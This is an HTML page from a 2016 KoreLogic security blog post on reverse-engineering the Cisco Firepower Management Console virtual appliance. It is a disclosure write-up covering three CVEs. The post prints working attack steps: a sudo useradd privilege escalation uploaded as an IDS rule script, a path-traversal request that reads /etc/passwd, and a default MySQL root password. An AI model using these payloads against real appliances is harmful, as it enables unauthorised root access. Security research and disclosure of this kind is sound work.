@@ -1,0 +1,460 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>KoreLogic Blog</title>
+        <script src="/assets/js/gtag.js?id=UA-118581697-4"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'UA-118581697-4');
+        </script>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <!--[if lte IE 8]><script src="/assets/js/ie/html5shiv.js"></script><![endif]-->
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <!--[if lte IE 8]><link rel="stylesheet" href="/assets/css/ie8.css" /><![endif]-->
+        <!--[if lte IE 9]><link rel="stylesheet" href="/assets/css/ie9.css" /><![endif]-->
+        <description style="display:none">KoreLogic Blog</description>
+    </head>
+    <body>
+        <div id="page-wrapper">
+            <!-- Header -->
+            <div id="header">
+                <!-- Logo -->
+                <div class="container">
+                    <a href="/" id="logo"><img src="/images/korelogo.png"/></a>
+                </div>
+
+                <!-- Nav -->
+
+<nav id="nav">
+                    <ul>
+                        <li><a href="https://korelogic.com">Main</a></li>
+                        <li class="current"><a href="https://blog.korelogic.com/blog">Blog</a></li>
+                        <li><a href="https://contest.korelogic.com/">Contest</a></li>
+                        <li><a href="https://git.korelogic.com">Tools</a></li>
+                        <li><a href="https://korelogic.com/contact.html">Contact Us</a></li>
+                    </ul>
+                </nav>
+
+            </div>
+
+            <!-- Main -->
+
+            <section class = "wrapper style2">
+                <div class="container">
+                    <div id="content">
+                        <!-- Content -->
+                        <article>
+
+
+<!-- <table width="90%"><tr><td align="right"><span style="color:black; font-size: 16px">2016-10-10</span></td></tr></table> -->
+<div>
+<table width="100%" class="bottomdotted">
+ <tr>
+  <td align="left"><a name="virtual_appliance_spelunking"></a><a href="https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking" style="text-decoration:none"><span class="mediumheadlineblue" style="font-size:26px; color:black;">Virtual Appliance Spelunking</span></a>
+  <td style="text-align:right"><span style="color:black; font-size: 20px">2016-10-10 15:35</span></td>
+ </tr>
+</table>
+<p>
+<div style="font-size: 18px">
+
+<p>
+Hello again and welcome back. Today I want to talk about a Sunday I
+spent reversing the Cisco Firepower Management Console virtual
+appliance that resulted in multiple CVEs being issued. The tricks I
+will show have worked on four or five other virtual appliances from
+other vendors. Results from those are either pending disclosure or
+have already been reported by other researchers. Either way, this
+should be something you can easily recreate to find vulnerabilities.
+</p>
+
+
+
+<p>
+Before I start, normally I am just barely satisfied or outright
+discouraged by the vendor's response. I want to commend the Cisco team
+for their rapid response and great communication.  They didn't drag
+their feet nor attempt to prevaricate or downplay the findings (as the
+below issues all require some level of authenticated access to
+leverage).  Cisco has issued three CVEs for the vulnerabilities we
+disclosed:  </p>
+
+<ul class="default">
+ <li>CVE-2016-6433 <a href="https://www.korelogic.com/Resources/Advisories/KL-001-2016-007.txt">KL-001-2016-007</a>
+ <li>CVE-2016-6434 <a href="https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt">KL-001-2016-005</a>
+ <li>CVE-2016-6435 <a href="https://www.korelogic.com/Resources/Advisories/KL-001-2016-006.txt">KL-001-2016-006</a>
+</ul>
+
+<p>
+Everything is virtualized nowadays, including appliances. What is
+great is that most companies who develop appliances will allow trial
+copies of them to be released. Just Google 'Virtual appliance trial
+download' and you'll find plenty of targets. I did just that and came
+across a trial download for the Cisco Firepower Management Console.
+</p>
+
+<pre class="snippet">(Cisco_Firepower_Management_Center_VMware-6.0.1-1213.tar.gz) = c93e8874bc114bee4ee519f2e361ada52d7fee5f</pre>
+
+<p>It contained the following files:</p>
+
+<pre class="snippet">
+(Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.vmdk) = 20dbf629a1a550e994226692029fbe6d84f33484
+(Cisco_Firepower_Management_Center_Virtual_VMware-ESXi-6.0.1-1213.mf) = 4d1f63d597aa9b10d0b79a070455367fa7bf5716
+(Cisco_Firepower_Management_Center_Virtual_VMware-ESXi-6.0.1-1213.ovf) = 8a6de8b9433f9b72e1a6561793b21b771069aabe
+(Cisco_Firepower_Management_Center_Virtual_VMware-VI-6.0.1-1213.mf) = 61789395ec52e6d0e1f59c9645fa2ea6acf2f719
+(Cisco_Firepower_Management_Center_Virtual_VMware-VI-6.0.1-1213.ovf) = be3f21da5375b092be675c171840707785b98389
+</pre>
+
+<p>
+Once files are extracted from gzip tarball, I converted the vmdk into
+a raw file. </p>
+
+<pre class="snippet">
+$ qemu-img convert -f vmdk -O raw Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.vmdk \
+	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw
+</pre>
+
+<p>
+Next, I review the partitions. </p>
+
+<pre class="snippet">
+$ fdisk -l Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw
+
+Disk Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw: 250 GiB, 268435456000 bytes, 524288000 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x423b7500
+
+Device                                                                 Boot    Start       End   Sectors   Size Id Type
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw1 *        2048    194559    192512    94M 83 Linux
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw2        194560   2195455   2000896   977M 82 Linux swap / Solaris
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw3       2195456 524287999 522092544   249G  f W95 Ext'd (LBA)
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw5       2197504  10008575   7811072   3.7G 83 Linux
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw6      10008577  17820312   7811736   3.7G 83 Linux
+Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw7      17820314 524287999 506467686 241.5G 83 Linux
+</pre>
+
+<p>
+Now I will go through the file content of each Linux partition until I
+come across something interesting.  Note that fdisk's output is in
+512-byte blocks, but the loop offsets below are in bytes, i.e. blocks
+* 512. </p>
+
+<pre class="snippet">
+$ umount /mnt/temp_mnt;mount -o ro,loop,offset=1048576 \
+	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw /mnt/temp_mnt/; \
+	ls -la /mnt/temp_mnt/
+total 9438
+drwxrwxr-x  6 root root    1024 Mar 18 18:34 .
+drwxr-xr-x 10 root root    4096 Sep  3 01:13 ..
+drwxrwxr-x  2 root root    1024 Mar 18 18:32 boot
+-rw-r--r--  1 root root     512 Mar 18 18:34 boot.0800
+-rw-r--r--  1 root root 4308496 Mar 18 18:32 bzImage-3.10.53-sf.virtual-26
+-rw-r--r--  1 root root  113162 Feb 22  2016 coffee.bmp
+-rw-r--r--  1 root root     426 Feb 22  2016 coffee.dat
+-rw-r--r--  1 root root   22466 Feb 22  2016 debian.bmp
+-rw-r--r--  1 root root     423 Feb 22  2016 debian.dat
+-rw-r--r--  1 root root   22560 Feb 22  2016 debian-de.bmp
+-rw-r--r--  1 root root     426 Feb 22  2016 debian-de.dat
+-rw-r--r--  1 root root   31628 Feb 22  2016 debianlilo.bmp
+-rw-r--r--  1 root root     435 Feb 22  2016 debianlilo.dat
+drwxrwxr-x  2 root root    1024 Mar 18 18:32 grub
+-rw-r--r--  1 root root 2614888 Mar 18 18:33 initrd-3.10.53-sf.virtual-26
+-rw-r--r--  1 root root   22578 Feb 22  2016 inside.bmp
+-rw-r--r--  1 root root     432 Feb 22  2016 inside.dat
+drwxrwxr-x  2 root root    1024 Mar 18 18:32 kernels
+drwx------  2 root root   12288 Mar 18 18:31 lost+found
+-rw-------  1 root root   82944 Mar 18 18:34 map
+-rw-r--r--  1 root root    6878 Feb 22  2016 onlyblue.bmp
+-rw-r--r--  1 root root     424 Feb 22  2016 onlyblue.dat
+lrwxrwxrwx  1 root root      32 Mar 18 18:32 System.map -&gt; System.map-3.10.53-sf.virtual-26
+-rw-r--r--  1 root root 2372553 Mar 18 18:32 System.map-3.10.53-sf.virtual-26
+-rw-r--r--  1 root root   33192 Feb 22  2016 tuxlogo.bmp
+-rw-r--r--  1 root root     423 Feb 22  2016 tuxlogo.dat
+$ umount /mnt/temp_mnt;mount -o ro,loop,offset=1125122048 \
+	Cisco_Firepower_Management_Center_Virtual_VMware-6.0.1-1213-disk1.raw /mnt/temp_mnt/; \
+	ls -la /mnt/temp_mnt/
+total 92
+drwxr-xr-x 20 root root  4096 Mar 18 18:34 .
+drwxr-xr-x 10 root root  4096 Sep  3 01:13 ..
+drwxrwxr-x  2 root root  4096 Mar 18 18:33 bin
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 boot
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 dev
+drwxrwxr-x 36 root root  4096 Mar 18 18:34 etc
+-rw-r--r--  1 root root     0 Feb 22  2016 .firstboot
+drwxr-xr-x  2 root root  4096 Oct  6  1997 home
+drwxr-xr-x  5 root root  4096 Mar 18 18:33 lib
+drwxrwxr-x  3 root root  4096 Mar 18 18:33 lib64
+drwx------  2 root root 16384 Mar 18 18:31 lost+found
+drwxr-xr-x  5 root root  4096 Mar 15  2002 mnt
+drwxr-xr-x  2 root root  4096 Mar 18 18:34 opt
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 proc
+-rw-r--r--  1 root root     0 Mar 18 18:33 .reconfigure
+drwx------  2 root root  4096 Mar 18 18:34 root
+drwxrwxr-x  2 root root  4096 Feb 22  2016 sbin
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 sys
+drwxrwxrwt  2 root root  4096 Mar 18 18:34 tmp
+drwxr-xr-x 19 root root  4096 Dec 14  2015 usr
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 var
+drwxr-xr-x  2 root root  4096 Mar 18 18:31 Volume
+</pre>
+
+<p>
+So, partition 1 is /boot, and partition 5 looks like /.  After
+browsing the filesystems a bit, I noticed the www user has a sudoers
+entry for the useradd binary. </p>
+
+<pre class="snippet-ns">
+$ grep useradd etc/sudoers
+www     ALL = NOPASSWD: /usr/sbin/useradd
+</pre>
+
+<p>
+Additionally, I noticed that there is a group whose users can execute
+any command as root. By default, only the admin user can do so. </p>
+
+<pre class="snippet-ns">
+$ grep ldapgroup etc/sudoers
+%ldapgroup ALL = (ALL) ALL
+$ grep ldapgroup etc/group
+ldapgroup::201:admin
+</pre>
+
+<p>
+The useradd binary from the appliance has the flag -g which allows you
+to specify which group to place a newly created user into.  It also
+supports specifying the new user's password hash on the command line. </p>
+
+<pre class="snippet-ns">
+Usage: useradd [options] LOGIN
+
+Options:
+  -b, --base-dir BASE_DIR       base directory for the home directory of the
+                                new account
+  -c, --comment COMMENT         GECOS field of the new account
+  -d, --home-dir HOME_DIR       home directory of the new account
+  -D, --defaults                print or change default useradd configuration
+  -e, --expiredate EXPIRE_DATE  expiration date of the new account
+  -f, --inactive INACTIVE       password inactivity period of the new account
+  -g, --gid GROUP               name or ID of the primary group of the new
+                                account
+[snip]
+  -p, --password PASSWORD       encrypted password of the new account
+[snip]
+</pre>
+
+Therefore, if I could get the www user to run a specific command I
+could get root.  Here is the command: </p>
+
+<pre class="snippet">
+sudo useradd -g ldapgroup -p `openssl passwd -1 &lt;password&gt;` &lt;username&gt;
+</pre>
+
+<p>
+The management web application maintains ten separate security roles.
+Only two of those roles can update IDS signature rules. The two roles
+are: Administrator, and Intrusion Administrator. With the exception of
+the Administrator user, none of these groups afford the user shell
+access. </p>
+
+<p>
+Oddly enough, the target appliance uses a shell script to do the IDS
+rule update.  I tried the following: </p>
+
+<pre class="snippet">
+POST /DetectionPolicy/rules/rulesimport.cgi?no_mojo=1 HTTP/1.1
+[snip]
+Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
+[snip]
+-----------------------------15519792567789791301241925798
+Content-Disposition: form-data; name="file"; filename="exploit.sh"
+Content-Type: application/octet-stream
+
+sudo useradd -g ldapgroup -p `openssl passwd -1 korelogic` korelogic
+[snip]
+
+HTTP/1.1 200 OK
+Date: Fri, 30 Sep 2016 21:43:14 GMT
+Server: Apache
+Vary: Accept-Encoding
+X-Frame-Options: SAMEORIGIN
+Content-Length: 49996
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+[snip]
+</pre>
+
+<p>
+Everything in the application looked like it had worked out
+successfully.  So, I tried to ssh. </p>
+
+<pre class="snippet">
+$ ssh korelogic@1.3.3.7
+Password:
+Last login: Sat Oct  1 02:21:00 2016 from 1.3.3.7
+
+Copyright 2004-2016, Cisco and/or its affiliates. All rights reserved.
+Cisco is a registered trademark of Cisco Systems, Inc.
+All other trademarks are property of their respective owners.
+
+Cisco Fire Linux OS v6.0.1 (build 37)
+Cisco Firepower Management Center for VMWare v6.0.1 (build 1213)
+
+Could not chdir to home directory /Volume/home/korelogic: No such file or directory
+korelogic@firepower:/$ sudo su -
+Password:
+root@firepower:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+</pre>
+
+<p>
+A full exploit can be found <a
+href="https://blog.korelogic.com/2016/10/10/virtual_appliance_spelunking/kl-cisco-firepower-rce.py">here</a>. </p>
+
+<p>
+This was issued CVE-2016-6433. </p>
+
+<p>
+I also found a few other noteworthy things during the time I spent
+playing with the target appliance. There is a report function that
+contains a local file inclusion vulnerability. </p>
+
+<pre class="snippet">
+GET /events/reports/view.cgi?download=1&files=../../../etc/passwd%00 HTTP/1.1
+Host: [redacted]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Cookie: CGISESSID=2ee7e6f19a104f4453e201f26fdbd6f3
+Connection: close
+
+HTTP/1.1 200 OK
+Date: Fri, 22 Apr 2016 23:58:41 GMT
+Server: Apache
+Content-Disposition: attachment; filename=passwd
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Type: application/octet-stream
+Content-Length: 623
+
+root:x:0:0:Operator:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+mysql:x:27:27:MySQL:/var/lib/mysql:/sbin/nologin
+nobody:x:99:99:nobody:/:/sbin/nologin
+sshd:x:33:33:sshd:/:/sbin/nologin
+www:x:67:67:HTTP server:/var/www:/sbin/nologin
+sfrna:x:88:88:SF RNA User:/Volume/home/sfrna:/sbin/nologin
+snorty:x:90:90:Snorty User:/Volume/home/snorty:/sbin/nologin
+sfsnort:x:95:95:SF Snort User:/Volume/home/sfsnort:/sbin/nologin
+sfremediation:x:103:103::/Volume/home/remediations:/sbin/nologin
+admin:x:100:100::/Volume/home/admin:/bin/sh
+casuser:x:101:104:CiscoUser:/var/opt/CSCOpx:/bin/bash
+</pre>
+
+<p>
+This was issued CVE-2016-6435. </p>
+
+<p>
+The root acount of a local MySQL database where most everything
+resides is protected with the password "admin". </p>
+
+<pre class="snippet">
+root@firepower:/Volume/6.0.1# mysql -u root --password=admin
+Warning: Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 23348
+Server version: 5.6.24-enterprise-commercial-advanced-log MySQL Enterprise Server - Advanced Edition (Commercial)
+
+Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| Sourcefire         |
+| external_data      |
+| external_schema    |
+| mysql              |
+| performance_schema |
+| sfsnort            |
++--------------------+
+7 rows in set (0.00 sec)
+
+mysql&gt;
+</pre>
+
+<p>
+This listener is not externally exposed, but still using a static
+password of 'admin' is not a great idea. </p>
+
+<p>
+This was issued CVE-2016-6434. </p>
+
+<p>
+We also found a denial-of-service for the web application management
+interface.  That's not as exciting though, I won't go into details on
+it here but information regarding it can be found on our <a
+href="https://www.korelogic.com/Resources/Advisories/KL-001-2016-005.txt">advisory
+page</a>. </p>
+
+
+<p>
+That's all I have for now. Thanks for reading! </p>
+
+</div>
+<br />
+<table width=95% class="bottomdotted">
+ <tr>
+  <td align="left">0 comments
+  <td style="text-align:right"> <i>Posted by <span class="bluehighlight">Matt</span> at: 15:35 <a href="https://blog.korelogic.com/blog"></a>
+  <a href="https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking">permalink</a></i>
+ </tr>
+</table>
+</p>
+
+<b></b>
+
+<p class="commentform">Comments are closed for this story.</p>
+</p>
+</div>
+<br />
+            <div id="footer">
+                <div class="container">
+                    <!-- Icons -->
+                    <ul class="icons">
+                        <li><a href="https://twitter.com/CrackMeIfYouCan" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                        <li><a href="https://github.com/korelogicsecurity" class="icon fa-github"><span class="label">GitHub</span></a></li>
+                        <li><a href="https://www.linkedin.com/company/korelogic" class="icon fa-linkedin"><span class="label">LinkedIn</span></a></li>
+                    </ul>
+                    <br>
+                    <ul class="icons">
+                        <p>Copyright 2021. KoreLogic Security. All rights reserved</p>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Scripts -->
+        <script src="/assets/js/jquery.min.js"></script>
+        <script src="/assets/js/jquery.dropotron.min.js"></script>
+        <script src="/assets/js/skel.min.js"></script>
+        <script src="/assets/js/util.js"></script>
+        <!--[if lte IE 8]><script src="/assets/js/ie/respond.min.js"></script><![endif]-->
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
